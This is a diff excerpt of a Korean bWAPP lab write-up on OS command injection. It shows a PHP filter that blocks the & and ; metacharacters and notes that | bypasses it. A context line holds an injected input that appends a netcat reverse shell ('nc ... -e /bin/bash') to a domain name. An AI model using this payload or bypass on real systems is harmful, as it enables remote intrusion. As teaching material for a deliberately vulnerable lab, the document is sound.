@@ -70,6 +70,7 @@ www.nsa.gov; nc 172.20.120.196 5252 -e /bin/bash
 ![그림 1-4](/assets/image/bwapp/injection/image4.png)
 ## Level - Medium
 > Level - Medium 에서는 &, ; 메타문자가 필터링 된 걸 알 수 있다.
+
 ```php
 function commandi_check_1($data)
 {
@@ -79,6 +80,7 @@ function commandi_check_1($data)
     
     return $input;
 ```
+
 > &와 ; 메타문자가 필터링 되었어도, | 메타문자를 통해 두번 째 인자가 시스템 명령어로 실행이 가능하다.
 
 
